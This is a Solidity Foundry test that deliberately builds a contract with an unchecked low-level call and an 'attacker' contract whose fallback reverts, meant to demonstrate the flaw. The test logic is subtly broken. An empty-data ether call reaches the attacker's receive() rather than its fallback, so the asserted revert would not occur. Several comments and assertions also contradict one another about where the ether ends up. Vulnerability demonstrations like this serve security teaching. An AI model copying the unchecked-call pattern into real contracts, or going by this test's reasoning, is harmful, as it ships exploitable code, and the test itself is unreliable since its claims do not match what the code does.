pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract Victim {
    mapping(address => uint256) public balances;

    constructor() payable {
        // Initialize some balances and fund contract with 1 ether
        balances[address(this)] = 1 ether;
    }

    // Vulnerable function: sends ether to `to` using a low-level call without checking return value
    function sendEtherUnchecked(address payable to, uint256 amount) external {
        require(balances[address(this)] >= amount, "Insufficient balance");
        balances[address(this)] -= amount;
        // Vulnerable low-level call: return value ignored
        (bool success, ) = to.call{value: amount}("");
        // return value intentionally ignored
    }

    // Helper to receive ether
    receive() external payable {
        balances[address(this)] += msg.value;
    }
}

contract Attacker {
    Victim public victim;
    bool public fallbackCalled;

    constructor(Victim _victim) {
        victim = _victim;
    }

    // Fallback reverts to cause victim's call to fail
    fallback() external payable {
        fallbackCalled = true;
        revert("Attacker fallback revert");
    }

    // Helper to receive ether normally
    receive() external payable {}
}

contract ExploitTest is Test {
    Victim victim;
    Attacker attacker;

    function setUp() public {
        victim = new Victim{value: 1 ether}();
        attacker = new Attacker(victim);

        // Fund attacker with some ether
        vm.deal(address(attacker), 0);
    }

    function test_exploit_unchecked_low_level_calls() public {
        uint256 victimBalanceBefore = address(victim).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Victim tries to send 1 ether to attacker, but attacker's fallback reverts
        // Because victim ignores the return value of call(), balances are already deducted
        victim.sendEtherUnchecked{gas: 100000}(payable(address(attacker)), 1 ether);

        uint256 victimBalanceAfter = address(victim).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        // The fallback was called and reverted
        assertTrue(attacker.fallbackCalled(), "Fallback was not called");

        // Victim's balance decreased by 1 ether (deducted from balances mapping and actual ether)
        assertLt(victimBalanceAfter, victimBalanceBefore);

        // Attacker's balance did NOT increase because fallback reverted the transfer
        assertEq(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should not increase");

        // Victim's internal balance mapping decreased despite the failed transfer
        assertLt(victim.balances(address(victim)), 1 ether, "Victim internal balance not decreased");

        // This proves the unchecked low-level call vulnerability: victim lost ether internally
        // but attacker did not receive it, and victim did not revert.
    }
}

